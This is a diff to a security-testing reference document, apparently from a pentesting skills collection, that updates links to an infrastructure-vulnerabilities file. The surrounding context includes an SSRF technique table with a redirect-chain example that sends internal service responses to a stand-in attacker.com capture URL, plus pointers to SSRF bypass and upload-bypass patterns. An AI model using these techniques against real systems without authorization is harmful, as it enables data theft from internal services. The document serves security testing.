@@ -6,7 +6,7 @@ Advanced testing patterns for API-specific, GraphQL, JWT, OAuth, and specialized
 
 [Tech Stack Patterns](#tech-stack-patterns) | [GraphQL](#graphql) | [JWT](#jwt-json-web-token) | [OAuth 2.0](#oauth-20--openid-connect) | [Rate Limiting](#api-rate-limiting--resource-exhaustion) | [AI/Agent Routing](#aiagent-attack-surface-routing) | [n8n Sandbox Escape](#n8n--workflow-automation-sandbox-escapes) | [Path Normalization](#edge-framework-path-normalization-bypass) | [GraphQL WS Depth](#graphql-websocket-subscription-depth-bypass) | [Admin Panel Logic](#admin-panel-logic-errors--typo-to-rce-pattern) | [HTTP/3 Race](#http3-race-conditions-quicker) | [DNS Rebinding SSRF](#dns-rebinding-ssrf-bypass-toctou) | [RSC DoS](#react-server-components-dos) | [Vibe-Coded Apps](#vibe-coded-application-attack-surface) | [Data Pipeline SSTI](#data-pipeline-template-injection-ssti--ssrf) | [PortSwigger #1-3](#error-based-blind-ssti-detection-portswigger-1-2025) | [Stream Backpressure DoS](#stream-backpressure-dos-nodejs) | [Async Auth Bypass](#async-auth-bypass-missing-await) | [simple-git RCE](#npm-library-command-injection-simple-git)
 
-> **Infrastructure & platform patterns** (CSS exfiltration, SSRF chains, Node.js bypass, remote desktop, MDM, webmail RCE, critical infra auth bypass, MotW bypass): See [infrastructure-vulns.md](infrastructure-vulns.md)
+> **Infrastructure & platform patterns** (CSS exfiltration, SSRF chains, Node.js bypass, remote desktop, MDM, webmail RCE, critical infra auth bypass, MotW bypass): See [infrastructure-security/reference/infrastructure-vulns.md](../../infrastructure-security/reference/infrastructure-vulns.md)
 
 ---
 
@@ -454,14 +454,14 @@ For full AI/LLM hunting methodology, see the **ai-hunting** skill.
 | 3 | Chained redirect exfiltration | Redirect to internal service, then back to attacker: `internal:8080` → 302 → `attacker.com/capture?data=RESPONSE` | Internal service response data captured via redirect |
 | 4 | Redirect count differential | Compare redirect behavior for existing vs non-existing internal hosts | Redirect counts/timeouts reveal internal topology |
 
-**Severity Guidance:** High — upgrades informational blind SSRF to visible. Combine with [DNS rebinding](#dns-rebinding-ssrf-bypass-toctou) and [infrastructure-vulns SSRF cluster](infrastructure-vulns.md#ssrf-via-webhook-notification-and-import-endpoints).
+**Severity Guidance:** High — upgrades informational blind SSRF to visible. Combine with [DNS rebinding](#dns-rebinding-ssrf-bypass-toctou) and [infrastructure-vulns SSRF cluster](../../infrastructure-security/reference/infrastructure-vulns.md#ssrf-via-webhook-notification-and-import-endpoints).
 
 ---
 
 ## Cross-Reference Patterns
 
 - **Filename Canonicalization + TOCTOU Upload Bypass:** See [parser-differentials.md](parser-differentials.md#filename-canonicalization) — U+200B/ZWNJ/RTLO/null byte patterns, CVE-2026-28289 (FreeScout CVSS 10.0)
-- **SSRF Validation Gap (Webhook/Import):** See [infrastructure-vulns.md](infrastructure-vulns.md#ssrf-via-webhook-notification-and-import-endpoints) — RFC 1918 bypass, cloud metadata, March 2026 CVE cluster
+- **SSRF Validation Gap (Webhook/Import):** See [infrastructure-vulns.md](../../infrastructure-security/reference/infrastructure-vulns.md#ssrf-via-webhook-notification-and-import-endpoints) — RFC 1918 bypass, cloud metadata, March 2026 CVE cluster
 
 ---
 
